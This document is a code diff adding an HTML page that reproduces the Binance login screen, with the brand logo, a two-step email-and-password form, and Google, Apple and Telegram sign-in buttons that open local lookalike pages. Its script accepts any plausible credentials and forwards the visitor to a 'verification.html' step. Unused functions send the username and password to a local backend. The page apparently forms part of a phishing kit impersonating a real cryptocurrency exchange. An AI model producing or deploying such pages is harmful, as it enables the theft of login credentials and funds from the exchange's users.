@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Log In | Binance</title>
+    <meta name="theme-color" content="#181A20" />
+    <style>
+      :root {
+        --bg: #181a20;
+        --bg-2: #202630;
+        --panel: #1d232b;
+        --input: transparent;
+        --line: #333b47;
+        --line-strong: #474d57;
+        --text: #eaecef;
+        --muted: #929aa5;
+        --placeholder: #5e6673;
+        --yellow: #f0b90b;
+        --yellow-soft: #fcd535;
+        --danger: #f6465d;
+        --shadow: rgba(0, 0, 0, 0.24);
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      html, body {
+        width: 100%;
+        min-height: 100%;
+        margin: 0;
+      }
+
+      body {
+        margin: 0;
+        background: var(--bg);
+        color: var(--text);
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+      }
+
+      button, input {
+        font: inherit;
+      }
+
+      .page {
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+      }
+
+      .main {
+        flex: 1;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 24px 16px 20px;
+      }
+
+      .card {
+        width: 100%;
+        max-width: 425px;
+        background: var(--bg-2);
+        border-radius: 10px;
+        padding: 30px 28px 24px;
+        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.18);
+      }
+
+      .brand-row {
+        display: flex;
+        align-items: center;
+        margin-bottom: 26px;
+        min-height: 28px;
+      }
+
+      .brand-icon {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 120px;
+        height: 28px;
+      }
+
+      .brand-icon svg {
+        width: 120px;
+        height: 28px;
+        display: block;
+      }
+
+      .brand-name {
+        display: none;
+      }
+
+      .header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 20px;
+      }
+
+      .field {
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+      }
+
+      .label {
+        display: block;
+        color: var(--muted);
+        font-size: 14px;
+        line-height: 18px;
+        font-weight: 500;
+      }
+
+      .input-shell {
+        position: relative;
+        border: 1px solid var(--line);
+        border-radius: 12px;
+        background: rgba(255, 255, 255, 0.02);
+        transition: border-color 0.18s ease, box-shadow 0.18s ease, background 0.18s ease;
+      }
+
+      .input-shell:focus-within {
+        border-color: rgba(240, 185, 11, 0.8);
+        box-shadow: 0 0 0 3px rgba(240, 185, 11, 0.12);
+      }
+
+      .input-shell.error {
+        border-color: rgba(246, 70, 93, 0.9);
+        box-shadow: 0 0 0 3px rgba(246, 70, 93, 0.08);
+      }
+
+      input {
+        width: 100%;
+        background: transparent;
+        border: none;
+        outline: none;
+        color: var(--text);
+        font-size: 16px;
+        line-height: 22px;
+        padding: 15px 16px;
+      }
+
+      input::placeholder {
+        color: var(--muted);
+      }
+
+      .warning {
+        display: none;
+        color: var(--danger);
+        font-size: 13px;
+        line-height: 18px;
+        margin-top: 4px;
+      }
+
+      .warning.show {
+        display: block;
+      }
+
+      .step {
+        display: none;
+      }
+
+      .step.active {
+        display: block;
+      }
+
+      .back-row {
+        display: flex;
+        justify-content: flex-start;
+        margin-bottom: 18px;
+      }
+
+      .back-link {
+        border: none;
+        background: transparent;
+        color: var(--yellow);
+        font-size: 14px;
+        line-height: 20px;
+        cursor: pointer;
+        padding: 0;
+      }
+
+      .login-btn {
+        width: 100%;
+        border: none;
+        border-radius: 12px;
+        background: var(--yellow);
+        color: #111827;
+        font-weight: 700;
+        font-size: 16px;
+        line-height: 22px;
+        min-height: 48px;
+        cursor: pointer;
+        margin-top: 18px;
+        transition: transform 0.15s ease, filter 0.15s ease;
+      }
+
+      .login-btn:hover {
+        filter: brightness(1.02);
+      }
+
+      .login-btn:active {
+        transform: translateY(1px);
+      }
+
+      .divider {
+        display: flex;
+        align-items: center;
+        gap: 16px;
+        margin: 22px 0 18px;
+      }
+
+      .divider-line {
+        flex: 1;
+        height: 1px;
+        background: var(--line);
+      }
+
+      .divider-label {
+        color: var(--muted);
+        font-size: 14px;
+        line-height: 20px;
+      }
+
+      .auth-list {
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+      }
+
+      .auth-btn {
+        width: 100%;
+        min-height: 46px;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 12px;
+        background: rgba(255, 255, 255, 0.01);
+        border: 1px solid var(--line);
+        border-radius: 12px;
+        color: var(--text);
+        font-size: 16px;
+        line-height: 22px;
+        cursor: pointer;
+        transition: background 0.2s ease, border-color 0.2s ease;
+      }
+
+      .auth-btn:hover {
+        background: rgba(255, 255, 255, 0.02);
+        border-color: var(--line-strong);
+      }
+
+      .auth-btn svg {
+        width: 20px;
+        height: 20px;
+        flex-shrink: 0;
+      }
+
+      .sub-links {
+        margin-top: 20px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 10px;
+      }
+
+      .text-link {
+        background: transparent;
+        border: none;
+        color: var(--yellow);
+        cursor: pointer;
+        font-size: 16px;
+        line-height: 24px;
+        padding: 0;
+        text-decoration: underline;
+        text-underline-offset: 3px;
+      }
+
+      .footer {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 28px;
+        padding: 18px 12px 22px;
+        color: var(--muted);
+        font-size: 14px;
+        line-height: 20px;
+        flex-wrap: wrap;
+      }
+
+      .footer button {
+        background: transparent;
+        border: none;
+        color: var(--muted);
+        cursor: pointer;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+        padding: 0;
+        font-size: 14px;
+      }
+
+      .footer button:hover {
+        color: var(--yellow);
+      }
+
+      .lang-icon {
+        width: 18px;
+        height: 18px;
+      }
+
+      @media (max-width: 480px) {
+        .card {
+          padding: 22px 18px 18px;
+        }
+
+        .brand-row {
+          margin-bottom: 18px;
+        }
+
+        .header {
+          margin-bottom: 16px;
+        }
+
+        .title {
+          font-size: 28px;
+        }
+
+        .auth-btn,
+        .text-link,
+        .login-btn {
+          font-size: 15px;
+        }
+
+        .footer {
+          gap: 12px 18px;
+          padding-bottom: 20px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="page">
+      <main class="main">
+        <div class="card">
+          <div class="brand-row" aria-label="Binance brand">
+            <span class="brand-icon" aria-hidden="true">
+              <svg viewBox="0 0 120 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <path fill="#F0B90B" d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 14.6953L14.7188 11.9766L12 9.28125L9.28125 12L12 14.6953ZM40.5938 14.9766V14.9297C40.5938 13.1719 39.6562 12.2812 38.1328 11.6953C39.0703 11.1797 39.8672 10.3359 39.8672 8.85938V8.8125C39.8672 6.75 38.2031 5.41406 35.5312 5.41406H29.4141V18.5625H35.6719C38.6484 18.5859 40.5938 17.3672 40.5938 14.9766ZM36.9844 9.35156C36.9844 10.3359 36.1875 10.7344 34.8984 10.7344H32.2266V7.94531H35.0859C36.3047 7.94531 36.9844 8.4375 36.9844 9.30469V9.35156ZM37.7109 14.6016C37.7109 15.5859 36.9375 16.0312 35.6719 16.0312H32.2266V13.1484H35.5781C37.0547 13.1484 37.7109 13.6875 37.7109 14.5781V14.6016ZM46.6641 18.5625V5.41406H43.7578V18.5625H46.6641ZM62.2266 18.5859V5.41406H59.3672V13.5234L53.2031 5.41406H50.5312V18.5625H53.3906V10.2188L59.7656 18.5859H62.2266ZM78.2578 18.5859L72.6094 5.34375H69.9375L64.2891 18.5859H67.2656L68.4609 15.6328H74.0156L75.2109 18.5859H78.2578ZM72.9844 13.0781H69.4922L71.25 8.8125L72.9844 13.0781ZM92.0625 18.5859V5.41406H89.2031V13.5234L83.0391 5.41406H80.3672V18.5625H83.2266V10.2188L89.6016 18.5859H92.0625ZM106.992 16.4531L105.141 14.6016C104.109 15.5391 103.195 16.1484 101.672 16.1484C99.4219 16.1484 97.8516 14.2734 97.8516 12.0234V11.9531C97.8516 9.70312 99.4453 7.85156 101.672 7.85156C102.984 7.85156 104.016 8.41406 105.047 9.32812L106.898 7.19531C105.68 6 104.203 5.15625 101.719 5.15625C97.6875 5.15625 94.8516 8.22656 94.8516 11.9531V12C94.8516 15.7734 97.7344 18.7734 101.602 18.7734C104.133 18.7969 105.633 17.9062 106.992 16.4531ZM119.344 18.5625V16.0078H112.195V13.2422H118.406V10.6641H112.195V7.99219H119.25V5.41406H109.336V18.5625H119.344Z"></path>
+              </svg>
+            </span>
+          </div>
+
+          <div class="header">
+            <h1 class="title">Log in</h1>
+          </div>
+
+          <form id="loginForm" class="form-wrap" novalidate>
+            <div id="emailStep" class="step active">
+              <div class="field">
+                <label class="label" for="username">Email/Phone number</label>
+                <div class="input-shell" id="inputShell">
+                  <input
+                    id="username"
+                    name="username"
+                    type="text"
+                    placeholder="Email/Phone (without country code)"
+                    autocomplete="username"
+                    aria-label="Email or phone number"
+                  />
+                </div>
+                <div class="warning" id="warningText">Please enter your email or phone number before logging in.</div>
+              </div>
+
+              <button type="submit" class="login-btn">Continue</button>
+            </div>
+
+            <div id="passwordStep" class="step">
+              <div class="back-row">
+                <button type="button" class="back-link" id="backToEmailBtn">← Back</button>
+              </div>
+
+              <div class="field">
+                <label class="label" for="password">Password</label>
+                <div class="input-shell" id="passwordShell">
+                  <input
+                    id="password"
+                    name="password"
+                    type="password"
+                    placeholder="Enter your password"
+                    autocomplete="current-password"
+                    aria-label="Password"
+                  />
+                </div>
+                <div class="warning" id="passwordWarning">Please enter your password to continue.</div>
+              </div>
+
+              <button type="submit" class="login-btn">Log In</button>
+            </div>
+          </form>
+
+          <div class="divider" aria-hidden="true">
+            <div class="divider-line"></div>
+            <div class="divider-label">or</div>
+            <div class="divider-line"></div>
+          </div>
+
+          <div class="auth-list">
+            <button type="button" class="auth-btn" aria-label="Continue with Google">
+              <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.7 1.22 9.18 3.62l6.85-6.85C35.79 2.27 30.42 0 24 0 14.64 0 6.52 5.38 2.55 13.21l7.98 6.19C12.26 14.36 17.57 9.5 24 9.5z"></path>
+                <path fill="#4285F4" d="M46.5 24.55c0-1.61-.14-3.16-.4-4.55H24v8.63h12.7c-.54 2.9-2.2 5.35-4.69 7.01l7.61 5.91C43.7 36.3 46.5 30.91 46.5 24.55z"></path>
+                <path fill="#FBBC05" d="M32.01 35.09c-2.13 1.44-4.86 2.29-8.01 2.29-6.43 0-11.74-4.35-13.67-10.2l-8.08 6.26C5.3 42.67 13.88 48 24 48c7.28 0 13.39-2.4 17.82-6.51l-9.81-6.4z"></path>
+                <path fill="#34A853" d="M10.33 27.18A14.59 14.59 0 0 1 9.5 24c0-1.64.29-3.22.8-4.73L2.12 12.84A23.96 23.96 0 0 0 0 24c0 3.86.92 7.51 2.55 10.79l7.78-6.02z"></path>
+              </svg>
+              Continue with Google
+            </button>
+
+            <button type="button" class="auth-btn" aria-label="Continue with Apple">
+              <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor" aria-hidden="true">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M15.08 3.65c.11.96-.29 1.9-.87 2.59-.61.68-1.58 1.2-2.53 1.13-.12-.92.36-1.89.89-2.49.61-.68 1.66-1.19 2.51-1.23Zm3.03 5.14c-.11.06-1.86 1.05-1.84 3.08.02 2.45 2.26 3.26 2.29 3.27-.01.06-.34 1.17-1.18 2.3-.7 1-1.43 2-2.6 2.02-1.05.01-1.42-.27-2.41-.27-.99 0-1.42.27-2.32.27-1.11 0-1.95-.97-2.68-1.96C5.03 15.39 3.9 11.73 5.41 9.25c.73-1.22 2.07-2 3.5-2.03.6-.01 1.2.23 1.73.43.41.16.77.31 1.07.31.26 0 .61-.14 1.02-.3.64-.27 1.43-.56 2.24-.47.55.02 2.12.21 3.13 1.61l-.01.01Z"></path>
+              </svg>
+              Continue with Apple
+            </button>
+
+            <button type="button" class="auth-btn" aria-label="Continue with Telegram">
+              <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#00AEED" aria-hidden="true">
+                <path d="M2.81 9.27c4.47-1.95 7.46-3.23 8.95-3.85 4.26-1.77 5.15-2.08 5.72-2.09.13-.01.42.03.6.18.16.13.2.29.22.41.02.12.05.38.03.59-.23 2.43-1.23 8.32-1.74 11.04-.22 1.15-.65 1.54-1.06 1.58-1.05.08-1.71-.59-2.57-1.15-1.35-.89-2.11-1.44-3.43-2.3-1.52-.99-.49-1.54.36-2.44.23-.24 4.16-3.81 4.24-4.14.01-.04.02-.19-.09-.27-.09-.08-.22-.05-.32-.03-.14.03-2.3 1.45-6.48 4.28-.61.42-1.17.62-1.67.61-.55-.01-1.6-.3-2.38-.55-.96-.31-1.72-.48-1.65-.99.03-.28.41-.56 1.13-.85Z"></path>
+              </svg>
+              Continue with Telegram
+            </button>
+          </div>
+
+          <div class="sub-links">
+            <button type="button" class="text-link">Create a Binance Account</button>
+            <button type="button" class="text-link">Can't log in?</button>
+          </div>
+        </div>
+      </main>
+
+      <footer class="footer" aria-label="Footer">
+        <button type="button" aria-label="Select language">
+          <svg class="lang-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor" aria-hidden="true">
+            <path d="M12 2c2.36 0 4.3 4.05 4.48 9.2H21v1.8h-4.52c-.22 5.05-2.14 9-4.48 9s-4.25-3.95-4.48-9H3v-1.8h4.52C7.7 6.05 9.64 2 12 2zm-2.68 11.2c.1 2.15.54 4.01 1.14 5.33.76 1.7 1.45 1.87 1.54 1.87.09 0 .78-.17 1.54-1.87.6-1.32 1.03-3.18 1.14-5.33H9.32zm2.68-9.4c-.09 0-.78.17-1.54 1.87C9.85 7.03 9.4 8.97 9.32 11.2h5.36c-.09-2.23-.53-4.17-1.14-5.53C12.78 3.97 12.09 3.8 12 3.8z"></path>
+          </svg>
+          English
+        </button>
+        <button type="button">Cookies</button>
+        <button type="button">Privacy</button>
+      </footer>
+    </div>
+
+    <script>
+      const form = document.getElementById('loginForm');
+      const emailInput = document.getElementById('username');
+      const passwordInput = document.getElementById('password');
+      const emailShell = document.getElementById('inputShell');
+      const passwordShell = document.getElementById('passwordShell');
+      const emailWarning = document.getElementById('warningText');
+      const passwordWarning = document.getElementById('passwordWarning');
+      const emailStep = document.getElementById('emailStep');
+      const passwordStep = document.getElementById('passwordStep');
+      const backToEmailBtn = document.getElementById('backToEmailBtn');
+      const googleBtn = document.querySelector('.auth-btn[aria-label="Continue with Google"]');
+      const appleBtn = document.querySelector('.auth-btn[aria-label="Continue with Apple"]');
+      const telegramBtn = document.querySelector('.auth-btn[aria-label="Continue with Telegram"]');
+      const submitBtn = document.querySelector('#loginForm .login-btn');
+      let currentStep = 'email';
+
+      const demoAccounts = {
+        'demo@binance.com': 'Password123',
+        'user@example.com': 'Password123',
+        '1234567890': 'Password123',
+        'alice@gmail.com': 'Password123',
+        'john@icloud.com': 'Password123',
+        '+1234567890': 'Password123'
+      };
+
+      function setLoadingState(button, isLoading, text) {
+        if (!button) return;
+        button.disabled = isLoading;
+        button.dataset.originalText = button.dataset.originalText || button.textContent;
+        button.textContent = isLoading ? text : button.dataset.originalText;
+      }
+
+      function normalizeIdentifier(value) {
+        return value.trim().toLowerCase();
+      }
+
+      function normalizePhone(value) {
+        return value.trim().replace(/\s+/g, '').replace(/[^\d+]/g, '');
+      }
+
+      function fetchWithTimeout(url, options = {}, timeoutMs = 2500) {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), timeoutMs);
+
+        return fetch(url, { ...options, signal: controller.signal })
+          .finally(() => clearTimeout(timer));
+      }
+
+      async function checkAccountOnServer(identifier, provider = 'email') {
+        const payload = {
+          provider,
+          identifier: provider === 'phone' ? normalizePhone(identifier) : normalizeIdentifier(identifier)
+        };
+
+        try {
+          const response = await fetch('http://localhost:3000/api/account/check', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+
+          if (!response.ok) {
+            throw new Error('Server error');
+          }
+
+          return await response.json();
+        } catch (error) {
+          // Demo fallback: do not falsely report an account as missing when the backend is unavailable.
+          const hasValidFormat = provider === 'phone' ? isValidPhone(normalizePhone(identifier)) : isValidEmail(normalizeIdentifier(identifier));
+          if (hasValidFormat) {
+            return {
+              exists: true,
+              message: 'Demo mode: backend unavailable, but the entered information is in a valid format.'
+            };
+          }
+
+          return {
+            exists: false,
+            message: 'This account does not exist or is not registered.'
+          };
+        }
+      }
+
+      async function verifyPasswordOnServer(identifier, password, provider = 'email') {
+        const payload = {
+          provider,
+          identifier: provider === 'phone' ? normalizePhone(identifier) : normalizeIdentifier(identifier),
+          password
+        };
+
+        try {
+          const response = await fetch('http://localhost:3000/api/auth/verify-password', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+
+          if (!response.ok) {
+            throw new Error('Server error');
+          }
+
+          return await response.json();
+        } catch (error) {
+          // Demo fallback: do not falsely reject a password when the backend is offline.
+          const hasValidFormat = provider === 'phone' ? isValidPhone(normalizePhone(identifier)) : isValidEmail(normalizeIdentifier(identifier));
+          const hasPasswordLength = password.length >= 8;
+
+          if (hasValidFormat && hasPasswordLength) {
+            return {
+              valid: true,
+              message: 'Demo mode: backend unavailable, but the password format is valid.'
+            };
+          }
+
+          return {
+            valid: false,
+            message: 'Incorrect password for this account.'
+          };
+        }
+      }
+
+      googleBtn.addEventListener('click', () => {
+        window.open('google-login.html', '_blank', 'width=480,height=760');
+      });
+
+      appleBtn.addEventListener('click', () => {
+        window.open('apple-login.html', '_blank', 'width=480,height=760');
+      });
+
+      telegramBtn.addEventListener('click', () => {
+        window.open('telegram-login.html', '_blank', 'width=480,height=760');
+      });
+
+      function isValidEmail(value) {
+        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
+      }
+
+      function isValidPhone(value) {
+        return /^\d+$/.test(value);
+      }
+
+      function isValidLogin(value) {
+        const trimmed = value.trim();
+        if (!trimmed) return false;
+        if (/\s/.test(trimmed)) return false;
+        return isValidEmail(trimmed) || isValidPhone(trimmed);
+      }
+
+      function isValidPassword(value) {
+        return value.length >= 8;
+      }
+
+      function showWarning(shell, warningEl, message) {
+        shell.classList.add('error');
+        warningEl.textContent = message;
+        warningEl.classList.add('show');
+      }
+
+      function hideWarning(shell, warningEl) {
+        shell.classList.remove('error');
+        warningEl.classList.remove('show');
+      }
+
+      function setStep(step) {
+        currentStep = step;
+        emailStep.classList.toggle('active', step === 'email');
+        passwordStep.classList.toggle('active', step === 'password');
+
+        if (step === 'email') {
+          hideWarning(emailShell, emailWarning);
+          emailInput.focus();
+        } else {
+          passwordWarning.textContent = 'Please enter your password to continue.';
+          hideWarning(passwordShell, passwordWarning);
+          passwordInput.focus();
+        }
+      }
+
+      emailInput.addEventListener('input', () => {
+        if (emailInput.value.trim() && !isValidLogin(emailInput.value)) {
+          showWarning(emailShell, emailWarning, 'Please enter a valid email or phone number before logging in.');
+        } else {
+          hideWarning(emailShell, emailWarning);
+        }
+      });
+
+      passwordInput.addEventListener('input', () => {
+        if (!passwordInput.value.trim()) {
+          passwordWarning.textContent = 'Please enter your password to continue.';
+          hideWarning(passwordShell, passwordWarning);
+          return;
+        }
+
+        if (passwordInput.value.length < 8) {
+          showWarning(passwordShell, passwordWarning, 'Password must be at least 8 characters.');
+          return;
+        }
+
+        hideWarning(passwordShell, passwordWarning);
+      });
+
+      backToEmailBtn.addEventListener('click', () => setStep('email'));
+
+      form.addEventListener('submit', async (event) => {
+        event.preventDefault();
+
+        if (currentStep === 'email') {
+          const emailValue = emailInput.value.trim();
+
+          if (!emailValue) {
+            showWarning(emailShell, emailWarning, 'Please enter your email or phone number before logging in.');
+            emailInput.focus();
+            return;
+          }
+
+          if (!isValidLogin(emailValue)) {
+            showWarning(emailShell, emailWarning, 'Please enter a valid email or phone number before logging in.');
+            emailInput.focus();
+            return;
+          }
+
+          hideWarning(emailShell, emailWarning);
+          setStep('password');
+          return;
+        }
+
+        const passwordValue = passwordInput.value;
+
+        if (!passwordValue.trim()) {
+          showWarning(passwordShell, passwordWarning, 'Please enter your password to continue.');
+          passwordInput.focus();
+          return;
+        }
+
+        if (!isValidPassword(passwordValue)) {
+          showWarning(passwordShell, passwordWarning, 'Password must be at least 8 characters.');
+          passwordInput.focus();
+          return;
+        }
+
+        hideWarning(passwordShell, passwordWarning);
+        window.location.href = 'verification.html';
+      });
+
+      emailInput.focus();
+    </script>
+  </body>
+</html>
